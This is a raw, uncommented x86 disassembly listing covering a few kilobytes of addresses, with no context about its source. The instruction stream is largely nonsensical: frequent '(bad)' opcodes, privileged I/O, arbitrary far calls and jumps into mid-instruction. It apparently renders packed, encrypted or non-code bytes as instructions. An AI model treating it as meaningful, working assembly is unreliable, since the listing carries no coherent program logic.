  4089d2:	cld    
  4089d3:	adc    eax,DWORD PTR [ebx+0x42]
  4089d6:	scas   al,BYTE PTR es:[edi]
  4089d7:	mul    BYTE PTR [ebp-0x1f2deb5]
  4089dd:	add    eax,0x3de051f5
  4089e2:	sbb    DWORD PTR [eax+0x43b798f9],ebx
  4089e8:	xor    eax,0x57c86fab
  4089ed:	xor    edi,0x26
  4089f0:	(bad)  
  4089f1:	call   0xd0b8:0x3a57dd88
  4089f8:	cbw    
  4089fa:	outs   dx,BYTE PTR ds:[esi]
  4089fb:	inc    esp
  4089fc:	aad    0x89
  4089fe:	jae    0x4089c9
  408a00:	mov    ecx,0x478fea05
  408a05:	sub    eax,0xf0441108
  408a0a:	out    0x28,eax
  408a0c:	pop    ss
  408a0d:	outs   dx,DWORD PTR ds:[esi]
  408a0e:	adc    bh,bh
  408a10:	and    BYTE PTR [edx],cl
  408a12:	sbb    ch,BYTE PTR [ebx+0x50]
  408a15:	inc    ebx
  408a16:	jge    0x4089ed
  408a18:	(bad)  
  408a19:	retf   
  408a1a:	ss dec ebp
  408a1c:	imul   DWORD PTR [edx]
  408a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a1f:	mov    WORD PTR [edx],?
  408a21:	adc    dl,ch
  408a23:	test   BYTE PTR [ebp+esi*2-0x322090fc],0xb9
  408a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a2c:	sahf   
  408a2d:	into   
  408a2e:	shl    DWORD PTR [eax-0x41],1
  408a31:	dec    ebx
  408a32:	xchg   ebx,eax
  408a33:	popf   
  408a34:	or     ebx,edi
  408a36:	int3   
  408a37:	jno    0x408a95
  408a39:	rcl    DWORD PTR [edx+0x71c9fb82],cl
  408a3f:	add    BYTE PTR [ebx],ch
  408a41:	mov    ah,0xe3
  408a43:	ja     0x408a08
  408a45:	mov    dh,0x59
  408a47:	push   ebx
  408a48:	int    0xd9
  408a4a:	sbb    edx,edx
  408a4c:	and    BYTE PTR [ecx+0x681db4c7],ah
  408a52:	dec    edx
  408a53:	aas    
  408a54:	leave  
  408a55:	jg     0x4089ec
  408a57:	inc    ebx
  408a58:	xor    ch,BYTE PTR [ebp+0x6b3e94d4]
  408a5e:	stos   BYTE PTR es:[edi],al
  408a5f:	pop    ss
  408a60:	mov    bh,0xa0
  408a62:	mov    esp,0xd14290e4
  408a67:	div    edx
  408a69:	fwait
  408a6a:	mov    edi,0xca46b2b9
  408a6f:	push   esi
  408a70:	inc    ebx
  408a71:	cmp    eax,0x13970ab6
  408a76:	xchg   ebp,eax
  408a77:	imul   ebx,DWORD PTR [ebp-0x70],0xffffffc2
  408a7b:	xor    dl,BYTE PTR [ecx]
  408a7d:	push   ds
  408a7e:	xchg   ecx,eax
  408a7f:	and    ebp,DWORD PTR [ebp-0x50b22967]
  408a85:	add    BYTE PTR [eax-0x2b],dl
  408a88:	jo     0x408aea
  408a8a:	es stc 
  408a8c:	or     eax,0xd1c325a2
  408a91:	dec    ebx
  408a92:	mov    bh,0x3e
  408a94:	dec    edi
  408a95:	out    0xad,al
  408a97:	lods   al,BYTE PTR ds:[esi]
  408a98:	mov    dl,0x73
  408a9a:	mov    ds:0xf4064d2e,al
  408a9f:	push   esp
  408aa0:	ret    
  408aa1:	add    DWORD PTR [ebp-0xe],edx
  408aa4:	jae    0x408ae7
  408aa6:	mov    cl,0x2b
  408aa8:	ins    BYTE PTR es:[edi],dx
  408aa9:	fiadd  WORD PTR [eax+0x1f]
  408aac:	mov    ds:0xf053e1b8,al
  408ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab2:	sbb    eax,0x9985348d
  408ab7:	xchg   ebp,eax
  408ab8:	pop    ds
  408ab9:	jg     0x408abe
  408abb:	pop    ss
  408abc:	jae    0x408af6
  408abe:	(bad)  
  408abf:	sub    bl,BYTE PTR [ebx+eax*4+0x6d]
  408ac3:	jmp    0x408a77
  408ac5:	push   esi
  408ac6:	(bad)  
  408ac8:	rcr    BYTE PTR ds:[ebx+0x54497c6c],0x10
  408ad0:	sub    al,0xe5
  408ad2:	and    BYTE PTR [esi+0x42],bl
  408ad5:	cmp    DWORD PTR [esi+0x8387a0c],edx
  408adb:	mov    eax,ds:0x47c9ce98
  408ae0:	mov    ch,0xf0
  408ae2:	cmp    dh,BYTE PTR [ecx-0x132a693f]
  408ae8:	cmc    
  408ae9:	xchg   edi,eax
  408aea:	xchg   esi,eax
  408aeb:	fistp  DWORD PTR [edi+ebp*2]
  408aee:	adc    eax,0xf38135f6
  408af3:	fist   WORD PTR [ebx]
  408af5:	out    dx,al
  408af6:	bnd jle 0x408b5a
  408af9:	adc    BYTE PTR [esi-0x30],dl
  408afc:	and    BYTE PTR [eax],dh
  408afe:	mov    bh,0x10
  408b00:	sahf   
  408b01:	fwait
  408b02:	dec    edx
  408b03:	daa    
  408b04:	push   ebp
  408b05:	jo     0x408ad1
  408b07:	cwde   
  408b08:	dec    ebp
  408b09:	xchg   esp,eax
  408b0a:	sub    al,BYTE PTR [esi]
  408b0c:	inc    edi
  408b0d:	outs   dx,BYTE PTR ds:[esi]
  408b0e:	adc    al,0xb9
  408b10:	xor    ebp,DWORD PTR [esi+0xb]
  408b13:	or     al,BYTE PTR [esi+0x4]
  408b16:	and    ebx,DWORD PTR [ebp+0x41b209be]
  408b1c:	sbb    DWORD PTR [edi+0xf],edx
  408b1f:	mov    bl,0xf4
  408b21:	and    bl,cl
  408b23:	and    ecx,DWORD PTR [esi+edi*1-0x2d]
  408b27:	cdq    
  408b28:	xchg   ebp,eax
  408b29:	jns    0x408b39
  408b2b:	ss inc edx
  408b2d:	cmc    
  408b2e:	xchg   esp,eax
  408b2f:	xor    al,0x6c
  408b31:	popa   
  408b32:	xchg   edx,eax
  408b33:	mov    ch,0xb3
  408b35:	fldcw  WORD PTR [edi-0x78bd09d6]
  408b3b:	idiv   DWORD PTR [edx]
  408b3d:	sar    BYTE PTR [ecx-0x1bcfb075],cl
  408b43:	jecxz  0x408b23
  408b45:	pop    ecx
  408b46:	dec    edx
  408b47:	ds dec ebp
  408b49:	push   es
  408b4a:	mov    cl,0x84
  408b4c:	pusha  
  408b4d:	xchg   ecx,eax
  408b4e:	sub    DWORD PTR [ecx],0x50
  408b51:	pop    edi
  408b52:	mov    ah,0xa0
  408b54:	inc    edi
  408b55:	std    
  408b56:	add    al,0x43
  408b58:	(bad)  
  408b59:	rol    BYTE PTR [edx-0x3811bc6a],1
  408b5f:	in     al,dx
  408b60:	aaa    
  408b61:	loop   0x408bb7
  408b63:	pop    eax
  408b64:	mov    dh,0xb7
  408b66:	adc    ebx,ebx
  408b68:	add    ecx,DWORD PTR [ecx-0x2e]
  408b6b:	mov    dh,0x20
  408b6d:	sub    ebp,esp
  408b6f:	xor    bl,ch
  408b71:	in     al,dx
  408b72:	rcl    al,1
  408b74:	dec    eax
  408b75:	mov    cl,0x36
  408b77:	push   edx
  408b78:	neg    BYTE PTR [edx+0x612e082e]
  408b7e:	xchg   edi,eax
  408b7f:	call   0xb9ded02c
  408b84:	push   ss
  408b85:	xchg   ah,dh
  408b87:	or     al,0xd2
  408b89:	or     dl,ch
  408b8b:	and    cl,BYTE PTR [ebx+0x72]
  408b8e:	sub    BYTE PTR [ebx+0x6e],bh
  408b91:	adc    cl,ah
  408b93:	and    DWORD PTR [eax],0xb010bcd7
  408b99:	cmp    edx,DWORD PTR [ecx-0x6296f2ff]
  408b9f:	cli    
  408ba0:	jbe    0x408b86
  408ba2:	inc    ebp
  408ba3:	rol    BYTE PTR [ebp+0x17acb322],1
  408ba9:	clc    
  408baa:	sahf   
  408bab:	(bad)  
  408bad:	and    BYTE PTR [esi*8-0x3750dae7],dl
  408bb4:	cmp    DWORD PTR ss:[ecx+0x3106bbc6],eax
  408bbb:	adc    DWORD PTR [edi],ebx
  408bbd:	(bad)  
  408bbe:	lahf   
  408bbf:	lock popa 
  408bc1:	test   DWORD PTR [edx+0x752bf39],edi
  408bc7:	xchg   esp,eax
  408bc8:	cli    
  408bc9:	aam    0x72
  408bcb:	mov    ch,0xe8
  408bcd:	dec    esp
  408bce:	bound  ebx,QWORD PTR [ebx]
  408bd0:	pop    ss
  408bd1:	shr    BYTE PTR [esi+esi*8],0x2d
  408bd5:	and    eax,esp
  408bd7:	pop    esp
  408bd8:	hlt    
  408bd9:	jo     0x408bed
  408bdb:	popf   
  408bdc:	or     al,0xb3
  408bde:	xor    bl,BYTE PTR [ebp-0x38]
  408be1:	or     DWORD PTR [ecx+0x1081ed8a],edi
  408be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be8:	int    0x12
  408bea:	inc    edx
  408beb:	jl     0x408bed
  408bed:	scas   eax,DWORD PTR es:[edi]
  408bee:	cmp    eax,DWORD PTR [ebp+0x4]
  408bf1:	xor    al,dl
  408bf3:	call   DWORD PTR [eax+0x76]
  408bf6:	or     al,0x12
  408bf8:	leave  
  408bf9:	lea    edx,[edi+0x10]
  408bfc:	jg     0x408c44
  408bfe:	sbb    BYTE PTR ds:0x1ca27592,al
  408c04:	scas   al,BYTE PTR es:[edi]
  408c05:	sbb    eax,0x8d31a68f
  408c0a:	add    al,0xf7
  408c0c:	fcomp  DWORD PTR [ebp+edx*4+0x56669b02]
  408c13:	cmc    
  408c14:	dec    ecx
  408c15:	fimul  WORD PTR [edx+0x57]
  408c18:	pop    ss
  408c19:	add    al,0xa3
  408c1b:	into   
  408c1c:	mov    edx,0xe2db18f7
  408c21:	adc    BYTE PTR [ebp+0x16b529e7],cl
  408c27:	cmp    DWORD PTR [ebx+0x17],edi
  408c2a:	cmp    ah,bl
  408c2c:	popf   
  408c2d:	xor    eax,DWORD PTR ds:0x929120d8
  408c33:	shr    bl,0xa
  408c36:	or     ah,BYTE PTR [ecx+0x75663659]
  408c3c:	sahf   
  408c3d:	adc    ebp,DWORD PTR [edx]
  408c3f:	sbb    al,0xce
  408c41:	mov    edx,0xe0458b11
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	int    0xb
  408c61:	jae    0x408cc8
  408c63:	ins    BYTE PTR es:[edi],dx
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408ce7
  408c6c:	dec    edi
  408c6d:	cmp    cl,BYTE PTR [eax+0x72]
  408c70:	aas    
  408c71:	jne    0x408cb4
  408c73:	mov    ebp,0x282d5abc
  408c78:	push   esp
  408c79:	(bad)  
  408c7a:	(bad)  
  408c7b:	fwait
  408c7c:	(bad)  
  408c7d:	gs or  ah,cl
  408c80:	pop    ss
  408c81:	ins    DWORD PTR es:[edi],dx
  408c82:	xlat   BYTE PTR ds:[ebx]
  408c83:	js     0x408c66
  408c85:	pop    ebp
  408c86:	push   edi
  408c87:	cmp    esi,ebp
  408c89:	call   0xead2:0xc423ef41
  408c90:	imul   ecx,eax,0x921cc4d6
  408c96:	dec    esi
  408c97:	cmp    eax,0x281673e6
  408c9c:	out    0x5f,eax
  408c9e:	jmp    0x408cec
  408ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca1:	mov    ds:0x1f670da2,eax
  408ca6:	adc    DWORD PTR [ebp-0x4a],eax
  408ca9:	xchg   edi,eax
  408caa:	add    dh,BYTE PTR gs:[esi-0x3c492028]
  408cb1:	jne    0x408c33
  408cb3:	and    BYTE PTR [eax+0x60],ch
  408cb6:	aam    0xc7
  408cb8:	sbb    DWORD PTR [ebx+0xe],0x72
  408cbc:	fidiv  DWORD PTR [edi]
  408cbe:	jae    0x408d23
  408cc0:	xor    dh,BYTE PTR [eax]
  408cc2:	xchg   edx,eax
  408cc3:	sar    BYTE PTR [edi-0x5c016b2f],1
  408cc9:	fsub   QWORD PTR [eax+0x113bd808]
  408ccf:	aam    0x20
  408cd1:	or     dl,cl
  408cd3:	and    DWORD PTR [edx],0x3d620b98
  408cd9:	sbb    ah,BYTE PTR [eax]
  408cdb:	idiv   DWORD PTR [edi+edi*8]
  408cde:	sub    al,0x3f
  408ce0:	lods   al,BYTE PTR ds:[esi]
  408ce1:	sar    BYTE PTR [ecx],1
  408ce3:	sbb    ebp,0xffffffea
  408ce6:	xor    ecx,DWORD PTR [ebp+0x30]
  408ce9:	or     DWORD PTR [edi],ebp
  408ceb:	mov    esi,0x5f55da43
  408cf0:	push   ebp
  408cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cf2:	xchg   DWORD PTR [edi-0x73d8030b],ecx
  408cf8:	jmp    0x408d50
  408cfa:	mov    al,0xf1
  408cfc:	call   0x95138ccb
  408d01:	out    0x12,eax
  408d03:	in     eax,dx
  408d04:	mov    ecx,0x608b70e9
  408d09:	retf   
  408d0a:	sub    BYTE PTR ds:0x2d2df636,dl
  408d10:	ins    BYTE PTR es:[edi],dx
  408d11:	in     eax,0x0
  408d13:	add    esi,eax
  408d15:	jb     0x408cff
  408d17:	es sub ebp,eax
  408d1a:	push   0xffffffc8
  408d1c:	inc    eax
  408d1d:	lods   eax,DWORD PTR ds:[esi]
  408d1e:	imul   DWORD PTR [edx]
  408d20:	clc    
  408d21:	in     al,dx
  408d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d23:	retf   0x2f4e
  408d26:	cmp    ch,BYTE PTR [ecx]
  408d28:	and    BYTE PTR [eax+0x15eb8e3f],0x9c
  408d2f:	frstor [ecx]
  408d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d32:	mov    bl,0x5f
  408d34:	js     0x408d82
  408d36:	pop    ss
  408d37:	cmp    DWORD PTR [eax+0x318c8633],esp
  408d3d:	aaa    
  408d3e:	fld    TBYTE PTR [ebp+ebp*2+0x65]
  408d42:	test   DWORD PTR [eax],0x971f7846
  408d48:	mov    eax,gs
  408d4a:	(bad)  [edx]
  408d4c:	fsubr  DWORD PTR [ecx+0x5cbdf072]
  408d52:	mov    bh,0x24
  408d54:	out    0x9f,eax
  408d56:	xor    ecx,DWORD PTR [esi-0x6c]
  408d59:	in     al,0x64
  408d5b:	scas   eax,DWORD PTR es:[edi]
  408d5c:	mov    cs,edx
  408d5e:	xchg   esi,eax
  408d5f:	(bad)  
  408d60:	cmp    eax,0x27682f9a
  408d65:	test   al,0x7e
  408d67:	mov    ebp,0xe00d6884
  408d6c:	call   0x9d035f11
  408d71:	dec    edi
  408d72:	pop    ebp
  408d73:	mov    WORD PTR [ebp+0x65],gs
  408d76:	test   esi,0x5e23c13e
  408d7c:	mov    dl,0x64
  408d7e:	lea    ebx,[eax+0x57]
  408d81:	cmp    ah,BYTE PTR [ebx+0x68af9df1]
  408d87:	(bad)  
  408d8a:	in     al,0x0
  408d8c:	xchg   esp,eax
  408d8d:	std    
  408d8e:	loope  0x408d16
  408d90:	mov    dh,0x65
  408d92:	popf   
  408d93:	out    dx,eax
  408d94:	and    DWORD PTR [ebp+0x64],0xa994bc8f
  408d9b:	clc    
  408d9c:	dec    edi
  408d9d:	dec    edi
  408d9e:	test   eax,0x325293ec
  408da3:	aam    0x43
  408da5:	xchg   edi,eax
  408da6:	fdivr  DWORD PTR [edx-0x75]
  408da9:	lods   eax,DWORD PTR ds:[esi]
  408daa:	mov    esi,?
  408dac:	or     ch,ch
  408dae:	push   eax
  408daf:	sub    DWORD PTR [eax-0x46],edi
  408db2:	xchg   esp,eax
  408db3:	loopne 0x408e21
  408db5:	call   FWORD PTR [eax+0x2fce3ff2]
  408dbb:	lods   al,BYTE PTR ds:[esi]
  408dbc:	xor    dl,BYTE PTR [ebp-0x29b68aae]
  408dc2:	pop    ecx
  408dc3:	mov    ch,0x8b
  408dc5:	sub    al,0x38
  408dc7:	dec    ecx
  408dc8:	fisttp WORD PTR [edi+0x41]
  408dcb:	jp     0x408d90
  408dcd:	or     BYTE PTR [edi+0x28da24cc],al
  408dd3:	clc    
  408dd4:	outs   dx,BYTE PTR ds:[esi]
  408dd5:	inc    esp
  408dd6:	stos   DWORD PTR es:[edi],eax
  408dd7:	inc    eax
  408dd8:	aaa    
  408dd9:	cmp    dh,0xd6
  408ddc:	mov    bl,BYTE PTR [ebx]
  408dde:	lahf   
  408ddf:	aam    0x1f
  408de1:	mov    ds:0xeafe342b,eax
  408de6:	jle    0x408dd3
  408de8:	adc    esp,esi
  408dea:	jo     0x408dc9
  408dec:	repz fisttp QWORD PTR [edx-0x6f]
  408df0:	and    DWORD PTR [edi+0x1c],0xa96f12ff
  408df7:	leave  
  408df8:	sbb    eax,0x8b3ddd42
  408dfd:	in     eax,dx
  408dfe:	sahf   
  408dff:	sbb    edi,DWORD PTR [ebx-0x230944d1]
  408e05:	popa   
  408e06:	mov    WORD PTR [edi],ss
  408e08:	xor    DWORD PTR [edi+0x7f],0x69fbd30d
  408e0f:	push   cs
  408e10:	mov    edx,0xc2678794
  408e15:	icebp  
  408e16:	les    ebx,FWORD PTR [esi]
  408e18:	xlat   BYTE PTR ds:[ebx]
  408e19:	and    ecx,DWORD PTR [ecx+eiz*1-0x41]
  408e1d:	imul   ecx,DWORD PTR [ecx],0x9fedcd06
  408e23:	and    eax,DWORD PTR [eax]
  408e25:	pxor   mm4,mm6
  408e28:	pop    ss
  408e29:	mov    bh,0xd4
  408e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2c:	fs cdq 
  408e2e:	adc    dh,BYTE PTR [ebx+esi*4-0x7b2bd468]
  408e35:	(bad)  [ecx-0x49da37b1]
  408e3b:	or     BYTE PTR [ecx+0x67],bl
  408e3e:	dec    esp
  408e3f:	dec    edi
  408e40:	mov    cl,0x85
  408e42:	push   ecx
  408e43:	sub    DWORD PTR [edi],edx
  408e45:	out    dx,eax
  408e46:	cmp    eax,0xc8d02638
  408e4b:	aam    0xaf
  408e4d:	and    al,0xf2
  408e4f:	jno    0x408eb2
  408e51:	les    ebp,FWORD PTR ds:0xfcb25bf5
  408e57:	icebp  
  408e58:	cmp    eax,0x5d300edd
  408e5d:	sbb    DWORD PTR ds:0x6c07250e,0xfc8b3a79
  408e67:	dec    esp
  408e68:	push   ebx
  408e69:	std    
  408e6a:	xchg   edx,eax
  408e6b:	jle    0x408e76
  408e6d:	add    al,0x80
  408e6f:	jnp    0x408e3b
  408e71:	popf   
  408e72:	es sub DWORD PTR gs:[ecx+eax*4],esp
  408e77:	cmc    
  408e78:	scas   al,BYTE PTR es:[edi]
  408e79:	pop    esp
  408e7a:	loope  0x408eb9
  408e7c:	inc    esp
  408e7d:	loope  0x408e56
  408e7f:	fst    QWORD PTR [ebp-0x39]
  408e82:	(bad)  [edx-0x24a0b537]
  408e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e89:	sub    edi,DWORD PTR [esi-0x3deafb9c]
  408e8f:	xchg   al,dl
  408e91:	or     al,0x2e
  408e93:	sbb    eax,0x7ff73f3e
  408e98:	sub    eax,0x27b56359
  408e9d:	popa   
  408e9e:	or     eax,0xec5b293d
  408ea3:	cld    
  408ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ea5:	pop    edi
  408ea6:	inc    ebx
  408ea7:	(bad)  
  408ea8:	dec    esp
  408ea9:	inc    ebx
  408eaa:	push   eax
  408eab:	popf   
  408eac:	push   esi
  408ead:	adc    BYTE PTR [esi-0x63],ch
  408eb0:	loope  0x408eee
  408eb2:	dec    ebx
  408eb3:	popf   
  408eb4:	fbstp  TBYTE PTR [edx]
  408eb6:	or     eax,0x9bfaee9c
  408ebb:	and    eax,0xfb8fd5a1
  408ec0:	fidivr WORD PTR [edi+0xb]
  408ec3:	push   ebp
  408ec4:	std    
  408ec5:	and    al,0x14
  408ec7:	xor    eax,0x9e97ca6
  408ecc:	loope  0x408f3d
  408ece:	push   edi
  408ecf:	arpl   WORD PTR [ebp-0xa],di
  408ed2:	push   ebx
  408ed3:	iret   
  408ed4:	mov    esi,0xba2e6481
  408ed9:	rcr    BYTE PTR [edi],1
  408edb:	mov    al,0x8f
  408edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ede:	pop    eax
  408edf:	sbb    edx,ecx
  408ee1:	sbb    al,0x1f
  408ee3:	clc    
  408ee4:	pop    ebx
  408ee5:	std    
  408ee6:	aaa    
  408ee7:	int    0x81
  408ee9:	and    DWORD PTR [ebx+0x16],ecx
  408eec:	adc    DWORD PTR [eax+edx*1-0x32da228d],edi
  408ef3:	out    0xa2,al
  408ef5:	pop    edi
  408ef6:	fs mov cl,0xca
  408ef9:	fsubrp st(2),st
  408efb:	addr16 aam 0x4b
  408efe:	jne    0x408efb
  408f00:	xor    ah,bh
  408f02:	adc    ch,BYTE PTR [edx+0x1eeb65e3]
  408f08:	dec    BYTE PTR [ebp+0x31ee0a41]
  408f0e:	test   BYTE PTR [edi+0x19],dh
  408f11:	shl    BYTE PTR [ebx+eiz*1-0x28],cl
  408f15:	xor    eax,0x7a810209
  408f1a:	dec    esp
  408f1b:	outs   dx,DWORD PTR ds:[esi]
  408f1c:	xchg   edi,eax
  408f1d:	xchg   ecx,eax
  408f1e:	in     al,0xe9
  408f20:	sbb    DWORD PTR ds:0x5aa796f4,ebx
  408f26:	sti    
  408f27:	pop    edx
  408f28:	or     bh,bl
  408f2a:	pop    es
  408f2b:	into   
  408f2c:	xchg   BYTE PTR [ebx],bh
  408f2e:	dec    edx
  408f2f:	sahf   
  408f30:	mov    edx,0x31c0d056
  408f35:	mov    dh,0x14
  408f37:	ins    BYTE PTR es:[edi],dx
  408f38:	lods   al,BYTE PTR ds:[esi]
  408f39:	mov    dl,0x2c
  408f3b:	dec    ecx
  408f3c:	cmp    eax,0x75d9d2d2
  408f41:	pop    es
  408f42:	or     al,0xd0
  408f44:	lods   eax,DWORD PTR ds:[esi]
  408f45:	scas   eax,DWORD PTR es:[edi]
  408f46:	xor    edx,esi
  408f48:	cmp    al,0xac
  408f4a:	sub    BYTE PTR [ebp-0x2e85c729],ah
  408f50:	jg     0x408f17
  408f52:	jno    0x408fbd
  408f54:	cmp    eax,0xb728b1f7
  408f59:	adc    DWORD PTR [ecx-0x4187a548],0xa3500e35
  408f63:	int3   
  408f64:	out    0x80,al
  408f66:	leave  
  408f67:	les    ecx,FWORD PTR [ecx+0x5ed36a57]
  408f6d:	jns    0x408f6c
  408f6f:	push   ss
  408f70:	xchg   edx,eax
  408f71:	mov    bh,0x5b
  408f73:	mov    ah,0x27
  408f75:	pop    ecx
  408f76:	in     eax,0x49
  408f78:	mov    WORD PTR [ecx-0x56],cs
  408f7b:	sahf   
  408f7c:	sub    dl,BYTE PTR [ebx]
  408f7e:	pop    ds
  408f7f:	jno    0x408f97
  408f81:	std    
  408f82:	ret    
  408f83:	ds inc edi
  408f85:	and    BYTE PTR [edx],ch
  408f87:	sbb    BYTE PTR ds:0x1663cbe,dh
  408f8d:	retf   
  408f8e:	sbb    eax,0xf74bd667
  408f93:	add    eax,0xa28864bc
  408f98:	pop    esi
  408f99:	aam    0x12
  408f9b:	mov    DWORD PTR [ecx-0x6c],ecx
  408f9e:	nop
  408f9f:	adc    BYTE PTR [ebx],bl
  408fa1:	push   edi
  408fa2:	test   ebx,0x5259d691
  408fa8:	popf   
  408fa9:	cdq    
  408faa:	nop
  408fab:	xchg   ebx,eax
  408fac:	mov    dh,0x4e
  408fae:	inc    eax
  408faf:	pop    ebp
  408fb0:	into   
  408fb1:	std    
  408fb2:	or     ebp,edx
  408fb4:	mov    BYTE PTR [edi],dl
  408fb6:	adc    dl,ah
  408fb8:	cwde   
  408fb9:	xor    ebp,ebx
  408fbb:	push   ebp
  408fbc:	ja     0x409032
  408fbe:	pop    es
  408fbf:	in     eax,dx
  408fc0:	dec    edi
  408fc1:	shl    BYTE PTR ds:0xfd603f7,0xaf
  408fc8:	xlat   BYTE PTR ds:[ebx]
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [ebp+eiz*4+0x5b],ebp
  408fde:	push   edi
  408fe0:	(bad)  
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x408f99
  408fe9:	dec    ecx
  408fea:	sub    al,0x73
  408fec:	cmp    al,0xda
  408fee:	mov    ah,0x28
  408ff0:	mov    eax,ds:0xd6c3e5f8
  408ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff6:	stos   BYTE PTR es:[edi],al
  408ff7:	pop    ebp
  408ff8:	daa    
  408ff9:	fs cli 
  408ffb:	mov    bh,0x96
  408ffd:	mov    eax,ds:0x5355676
  409002:	aad    0xec
  409004:	das    
  409005:	inc    edx
  409006:	dec    ebx
  409007:	scas   eax,DWORD PTR es:[edi]
  409008:	mov    eax,0x91040e7b
  40900d:	push   0xffffffc9
  40900f:	ins    BYTE PTR es:[edi],dx
  409010:	jae    0x40908b
  409012:	sbb    al,0x30
  409014:	ja     0x408fcb
  409016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409017:	mov    eax,ds:0xc3b2eb0f
  40901c:	jle    0x408ffd
  40901e:	aas    
  40901f:	jge    0x408fc3
  409021:	push   0xffffffea
  409023:	sahf   
  409024:	mov    ah,0x56
  409026:	add    al,0xd0
  409028:	in     eax,dx
  409029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40902a:	push   eax
  40902b:	xchg   esi,eax
  40902c:	out    dx,eax
  40902d:	mov    ah,0x26
  40902f:	int3   
  409030:	pop    ebx
  409031:	inc    esp
  409032:	(bad)  
  409033:	out    dx,al
  409034:	in     al,0xeb
  409036:	jle    0x408fba
  409038:	leave  
  409039:	push   ebx
  40903a:	lahf   
  40903b:	pop    esp
  40903c:	sub    dh,BYTE PTR [edi+0x5c31667b]
  409042:	or     ebp,DWORD PTR [ecx-0x2397ce42]
  409048:	les    eax,FWORD PTR [ebp+0x2c466a7]
  40904e:	xor    al,0x11
  409050:	out    0x91,eax
  409052:	add    edi,ebx
  409054:	mov    ds:0x4e090607,eax
  409059:	or     ecx,DWORD PTR [ebp+0x10c62193]
  40905f:	or     eax,ecx
  409061:	push   esi
  409062:	ss or  eax,0xe3740682
  409068:	rcl    DWORD PTR [esi],cl
  40906a:	inc    eax
  40906b:	mov    eax,ds:0xa0e98649
  409070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409071:	ret    
  409072:	sub    al,BYTE PTR [eax-0x153bdef]
  409078:	push   edi
  409079:	push   esp
  40907a:	cmp    al,BYTE PTR [ebp+0x62721a67]
  409080:	mov    al,0xef
  409082:	inc    eax
  409083:	retf   0x7abd
  409086:	mov    ds:0xbe90c2e4,eax
  40908b:	sub    BYTE PTR [edx-0x2a],dh
  40908e:	ja     0x409045
  409090:	xchg   edi,eax
  409091:	inc    esi
  409092:	adc    DWORD PTR [edi-0x22],ebp
  409095:	fbld   TBYTE PTR [ebx]
  409097:	loop   0x409078
  409099:	or     edi,DWORD PTR [edx-0xd]
  40909c:	mov    ebx,0x2f090e0b
  4090a1:	push   ebp
  4090a2:	jge    0x40910b
  4090a4:	cmp    edx,DWORD PTR [eax+esi*2+0x3]
  4090a8:	mov    dl,0x2b
  4090aa:	dec    ecx
  4090ab:	mov    bh,0xc9
  4090ad:	push   cs
  4090ae:	inc    ecx
  4090af:	daa    
  4090b0:	ret    0xed3
  4090b3:	sbb    BYTE PTR [esi+0x676ccce1],dl
  4090b9:	adc    al,0xa
  4090bb:	nop
  4090bc:	mov    ch,0xe4
  4090be:	inc    ax
  4090c0:	inc    edx
  4090c1:	pusha  
  4090c2:	add    eax,0x7b91ffd0
  4090c7:	pop    ecx
  4090c8:	pusha  
  4090c9:	(bad)  
  4090ca:	sti    
  4090cb:	push   esp
  4090cc:	int3   
  4090cd:	jle    0x40912b
  4090cf:	lds    eax,FWORD PTR [ebp+eiz*2+0x13]
  4090d3:	push   0xffffff96
  4090d5:	daa    
  4090d6:	std    
  4090d7:	shl    BYTE PTR [eax],0x2f
  4090da:	not    DWORD PTR [esi]
  4090dc:	cmp    ch,bh
  4090de:	add    eax,edx
  4090e0:	das    
  4090e1:	retf   0xc117
  4090e4:	sub    al,ch
  4090e6:	push   esi
  4090e7:	(bad)  
  4090e8:	enter  0x4eac,0x9f
  4090ec:	stos   BYTE PTR es:[edi],al
  4090ed:	fyl2xp1 
  4090ef:	test   DWORD PTR [esi],ebx
  4090f1:	mov    WORD PTR [edx],fs
  4090f3:	mov    cs,WORD PTR [eax]
  4090f5:	adc    al,0x1e
  4090f7:	in     eax,dx
  4090f8:	out    dx,eax
  4090f9:	inc    esp
  4090fa:	xchg   edi,eax
  4090fb:	push   ss
  4090fc:	pusha  
  4090fd:	pop    edx
  4090fe:	sti    
  4090ff:	mov    ah,0xba
  409101:	add    esi,ebp
  409103:	daa    
  409104:	lock add al,0x1f
  409107:	fidivr WORD PTR [ebp-0xc]
  40910a:	adc    DWORD PTR [edx+0x51],esp
  40910d:	sub    DWORD PTR [ecx+eax*1],eax
  409110:	call   FWORD PTR [edi-0x7f]
  409113:	pop    es
  409114:	int    0xc2
  409116:	mov    edx,0xa7f24ed3
  40911b:	add    ah,BYTE PTR [eax+edi*2]
  40911e:	movq   QWORD PTR [eax+0x38c8673d],mm5
  409125:	popa   
  409126:	jns    0x40910d
